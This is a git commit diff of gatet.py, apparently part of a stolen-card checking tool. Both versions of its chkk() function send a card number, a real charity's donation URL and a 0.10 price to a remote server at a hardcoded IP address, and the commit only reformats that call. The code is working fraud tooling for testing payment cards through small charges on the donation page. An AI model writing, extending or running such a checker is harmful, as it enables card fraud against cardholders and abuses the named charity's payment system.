4a5abcd4d55d9bfdd397c74bc506a56d1e4a8c98
a06505302-cpu <a06505302@gmail.com>
2026-03-14 17:53:50 +0200

    gatet.py

--- gatet.py
+++ gatet.py
@@ -1,14 +1,7 @@
 import requests
-
 def chkk(ccx):
-    cc = ccx.strip()
-    urll = "https://asburyhouse.net/donate/"
-    price = "0.10"
-    api = "http://151.247.197.54:5500/paypal"
-    params = {
-        "cc": cc,
-        "url": urll,
-        "price": price
-    }
-    res = requests.get(api, params=params).text
-    return res
+	cc=ccx.strip()
+	urll="https://asburyhouse.net/donate/"
+	price="0.10"
+	res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={price}').text
+	return res
